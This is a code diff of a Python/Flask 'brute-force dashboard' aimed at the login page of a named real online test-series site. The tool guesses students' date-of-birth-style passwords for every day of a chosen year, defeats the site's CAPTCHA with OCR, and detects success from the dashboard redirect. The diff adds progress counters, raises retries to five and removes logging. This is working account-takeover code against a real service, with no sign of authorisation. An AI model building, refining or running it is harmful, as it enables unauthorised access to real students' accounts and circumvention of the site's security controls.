@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Motion OTS Brute‑Force Dashboard – Retry on redirect failures
+Motion OTS Brute‑Force Dashboard – Final Optimized Version
 Author: Potato
 """
 
@@ -18,9 +18,6 @@ import re
 from datetime import datetime, timedelta
 import sqlite3
 import traceback
-import io
-from PIL import Image, ImageDraw
-
 from flask import Flask, render_template_string, request, jsonify, g
 
 # ---------- OCR SETUP (ddddocr) ----------
@@ -93,6 +90,8 @@ class BruteJob:
         self.thread = None
         self.stop_flag = False
         self.log_queue = queue.Queue()
+        self.total_passwords = 0
+        self.processed = 0
 
     @classmethod
     def from_db_row(cls, row):
@@ -143,8 +142,9 @@ class BruteJob:
         start_date = datetime(year, 1, 1)
         end_date = datetime(year, 12, 31)
         dates = [start_date + timedelta(days=i) for i in range((end_date - start_date).days + 1)]
-        total = len(dates)
-        log_queue.put_nowait(f"🚀 Starting for {user_id} over {year} ({total} passwords)")
+        self.total_passwords = len(dates)
+        self.processed = 0
+        log_queue.put_nowait(f"🚀 Starting for {user_id} over {year} ({self.total_passwords} passwords)")
 
         connector = aiohttp.TCPConnector(limit=5, limit_per_host=5)
         timeout = aiohttp.ClientTimeout(total=15, connect=10)
@@ -189,9 +189,14 @@ class BruteJob:
         if stop_event.is_set():
             return
         async with semaphore:
-            log_queue.put_nowait(f"⏳ Attempting {password}")
-            # Try up to 3 times (increased from 2) to handle redirect failures
-            for attempt in range(3):
+            self.processed += 1
+            progress = f"Progress: {self.processed}/{self.total_passwords}"
+            log_queue.put_nowait(f"⏳ Attempting {password}  ({progress})")
+            # Try up to 5 times with different CAPTCHAs
+            max_retries = 5
+            for attempt in range(max_retries):
+                if stop_event.is_set():
+                    return
                 try:
                     captcha = await self._fetch_captcha(session, log_queue)
                     if not captcha:
@@ -204,21 +209,19 @@ class BruteJob:
                         result_queue.put_nowait((password, session))
                         stop_event.set()
                         return
-                    # If retry‑able (captcha_error, redirect_failure, timeout), continue loop
                     if response in ("captcha_error", "redirect_failure", "timeout"):
-                        log_queue.put_nowait(f"🔄 Retry-able: {response} – retrying (attempt {attempt+1})")
+                        log_queue.put_nowait(f"🔄 Retry-able: {response} – retrying (attempt {attempt+1}/{max_retries})")
                         continue
                     else:
-                        # Other errors – log and give up on this password
                         log_queue.put_nowait(f"❌ Login failed: {response[:120]}")
-                        return
+                        return  # give up for this password
                 except asyncio.TimeoutError:
-                    log_queue.put_nowait(f"⏰ Timeout for {password}")
-                    continue  # retry on timeout
+                    log_queue.put_nowait(f"⏰ Timeout for {password}, retrying...")
+                    continue
                 except Exception as e:
                     log_queue.put_nowait(f"❌ Worker error: {str(e)}")
                     return
-            log_queue.put_nowait(f"⏭️ Giving up on {password} after retries")
+            log_queue.put_nowait(f"⏭️ Giving up on {password} after {max_retries} retries")
             await asyncio.sleep(0.2)
 
     async def _fetch_captcha(self, session, log_queue):
@@ -226,35 +229,21 @@ class BruteJob:
             try:
                 rand = int(time.time() * 1000) + attempt + os.getpid()
                 url = f"https://onlinetestseries.motion.ac.in/captcha.php?rand={rand}"
-                log_queue.put_nowait(f"📸 Fetch CAPTCHA (attempt {attempt+1})")
                 async with session.get(url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
-                    log_queue.put_nowait(f"📥 CAPTCHA status: {resp.status}")
                     if resp.status == 200:
                         img_bytes = await resp.read()
                         if len(img_bytes) < 100:
-                            log_queue.put_nowait("⚠️ Image too small")
                             continue
                         loop = asyncio.get_running_loop()
                         captcha = await loop.run_in_executor(None, solve_captcha_image, img_bytes, log_queue)
                         if captcha:
-                            log_queue.put_nowait(f"✅ CAPTCHA solved: {captcha}")
                             return captcha
-                        else:
-                            log_queue.put_nowait("⚠️ ddddocr empty")
-                    else:
-                        log_queue.put_nowait(f"⚠️ HTTP {resp.status}")
-            except asyncio.TimeoutError:
-                log_queue.put_nowait("⏰ CAPTCHA timeout")
-            except Exception as e:
-                log_queue.put_nowait(f"⚠️ CAPTCHA error: {e}")
-            await asyncio.sleep(0.3)
+                    await asyncio.sleep(0.2)
+            except:
+                continue
         return None
 
     async def _try_login(self, session, user_id, password, captcha, log_queue):
-        """
-        Attempt login and log detailed response.
-        Returns (success, reason)
-        """
         data = {
             "login_username": user_id,
             "login_password": password,
@@ -271,15 +260,11 @@ class BruteJob:
             async with session.post("https://onlinetestseries.motion.ac.in/login.php",
                                     data=data, headers=headers, allow_redirects=False,
                                     timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                log_queue.put_nowait(f"📡 Login response: HTTP {resp.status}")
                 if resp.status == 302:
                     location = resp.headers.get("Location", "")
-                    log_queue.put_nowait(f"📍 Redirect to: {location}")
                     if "dashboard/student-dashboard.php" in location:
                         return True, None
                     else:
-                        # Redirect to index.php or elsewhere – likely CAPTCHA error or wrong credentials
-                        # We treat this as a retry-able error (could be wrong CAPTCHA)
                         return False, "redirect_failure"
                 elif resp.status == 200:
                     text = await resp.text()
@@ -287,27 +272,19 @@ class BruteJob:
                     err = soup.find("div", class_="alertmsg")
                     if err:
                         err_text = err.text.strip()
-                        log_queue.put_nowait(f"⚠️ Login page error: {err_text}")
                         if "CAPTCHA" in err_text or "captcha" in err_text:
                             return False, "captcha_error"
                         else:
                             return False, err_text[:100]
                     else:
-                        # No error div – maybe success? But status 200 with no redirect is unusual.
-                        # Check if page contains dashboard links
                         if "dashboard" in text.lower() or "logout" in text.lower():
-                            log_queue.put_nowait("✅ Success detected via HTML content")
                             return True, None
-                        log_queue.put_nowait("⚠️ No error div, but not clearly success either")
                         return False, "unknown_failure"
                 else:
-                    log_queue.put_nowait(f"⚠️ Unexpected HTTP {resp.status}")
                     return False, f"HTTP {resp.status}"
         except asyncio.TimeoutError:
-            log_queue.put_nowait("⏰ Login timeout")
             return False, "timeout"
         except Exception as e:
-            log_queue.put_nowait(f"❌ Login exception: {str(e)}")
             return False, f"Exception: {e}"
 
     def stop(self):
@@ -408,7 +385,7 @@ const formData=new FormData();formData.append('user_id',user_id);formData.append
 try{
 const resp=await fetch('/start',{method:'POST',body:formData});const data=await resp.json();
 if(data.error){alert(data.error);resetUI();return}
-jobId=data.job_id;statusText.innerText='Running...';if(pollInterval)clearInterval(pollInterval);pollInterval=setInterval(pollStatus,800);loadJobs();
+jobId=data.job_id;statusText.innerText='Running...';if(pollInterval)clearInterval(pollInterval);pollInterval=setInterval(pollStatus,1000);loadJobs();
 }catch(err){alert('Error: '+err.message);resetUI()}
 });
 stopBtn.addEventListener('click',async()=>{
@@ -479,26 +456,16 @@ def list_jobs():
         rows = conn.execute("SELECT job_id, user_id, year, status, password, created_at FROM jobs ORDER BY created_at DESC").fetchall()
         return jsonify({'jobs': [dict(row) for row in rows]})
 
-# ---------- TEST ENDPOINT ----------
 @app.route('/test-password', methods=['POST'])
 async def test_password():
-    """
-    Manually test a password and see the raw response.
-    Expects JSON: {"user_id": "...", "password": "...", "captcha": "..."}
-    If captcha not provided, it will auto-fetch one.
-    """
     data = request.get_json()
     if not data:
         return jsonify({'error': 'JSON body required'}), 400
-
     user_id = data.get('user_id')
     password = data.get('password')
     captcha = data.get('captcha')
-
     if not user_id or not password:
         return jsonify({'error': 'user_id and password required'}), 400
-
-    # If captcha not provided, fetch one
     if not captcha:
         connector = aiohttp.TCPConnector(limit=1)
         timeout = aiohttp.ClientTimeout(total=10)
@@ -514,8 +481,6 @@ async def test_password():
                             break
             if not captcha:
                 return jsonify({'error': 'Could not fetch CAPTCHA'}), 400
-
-    # Now perform login
     headers = {
         "User-Agent": "Mozilla/5.0",
         "Accept": "text/html",
@@ -533,11 +498,7 @@ async def test_password():
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
             async with session.post("https://onlinetestseries.motion.ac.in/login.php",
                                     data=login_data, headers=headers, allow_redirects=False) as resp:
-                result = {
-                    'status': resp.status,
-                    'headers': dict(resp.headers),
-                    'body_preview': None
-                }
+                result = {'status': resp.status, 'headers': dict(resp.headers)}
                 if resp.status == 302:
                     result['location'] = resp.headers.get('Location')
                 else:
